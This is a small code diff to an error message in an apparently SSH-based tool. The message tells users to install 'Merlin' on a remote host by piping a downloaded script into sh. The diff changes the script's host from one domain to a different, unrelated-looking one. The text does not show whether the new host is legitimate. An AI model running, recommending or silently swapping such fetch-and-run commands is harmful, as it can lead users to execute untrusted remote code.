@@ -262,7 +262,7 @@ async function locateMerlin(ssh, remoteMerlinPath) {
 
   const err: any = new Error(
     'Merlin is not installed on the remote host (could not find a `merlin` executable). ' +
-      'Install it on the remote with:  curl -fsSL https://merlin-agent.aexagent.site/install.sh | sh  ' +
+      'Install it on the remote with:  curl -fsSL https://merlin-agent.epinoiahorizon.com/install.sh | sh  ' +
       '— or set the Merlin path explicitly in the SSH connection settings.'
   )
 
